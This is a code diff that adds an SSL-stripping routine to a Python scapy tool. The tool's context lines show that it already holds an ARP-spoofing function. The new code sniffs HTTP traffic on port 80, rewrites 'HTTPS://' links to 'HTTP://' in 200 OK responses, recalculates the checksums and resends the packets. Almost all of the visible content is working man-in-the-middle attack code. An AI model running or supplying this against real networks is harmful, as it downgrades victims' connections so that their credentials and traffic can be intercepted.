@@ -28,6 +28,27 @@ def ARP_spoofing():
     sendp(arp_M1, iface = "enp0s3")
     sendp(arp_M2, iface = "enp0s3")
 
+# SSL strip one packet
+def ssl_strip(packet):
+    if packet[TCP].payload:
+        payload = bytes(packet[TCP].payload)
+
+        # Only work with packets that are HTTP responses
+        if b"HTTP" in payload and b"200 OK" in payload:
+            # Strip the secure channels from the packet
+            modified_payload = payload.replace(b"HTTPS://", b"HTTP://")
+            packet.payload = bytes(modified_payload)
+
+            # By deleting the checksums, scapy will automatically recalculate them
+            del packet[IP].chksum
+            del packet[TCP].chksum
+
+            send(packet, verbose=0)
+
+def ssl_strip_attack():
+    # prn = function to apply to each sniffed packet
+    sniff(filter="tcp and port 80", prn=ssl_strip)
+	
 
 def silent_mode():
     try:
